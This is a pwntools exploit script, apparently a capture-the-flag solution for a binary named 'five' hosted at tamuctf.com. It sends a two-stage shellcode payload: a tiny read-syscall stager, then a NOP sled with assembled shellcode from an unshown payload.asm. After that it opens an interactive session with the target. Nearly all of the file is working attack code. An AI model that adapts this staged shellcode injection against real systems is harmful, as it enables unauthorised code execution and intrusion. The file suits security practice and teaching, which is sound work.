#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('five_patched')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote("tamuctf.com", 443, ssl=True, sni="five")
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
break *main+107
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def solve():
    os.system("nasm -f bin payload.asm -o payload.bin")

    stage1 = asm("""
        xchg rsi, rdx
        syscall
    """)

    stage2 = asm('nop')*0xf
    
    with open("payload.bin", "rb") as f:
        stage2 += f.read()

    io.send(stage1)
    io.send(stage2)

    io.interactive()

def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()

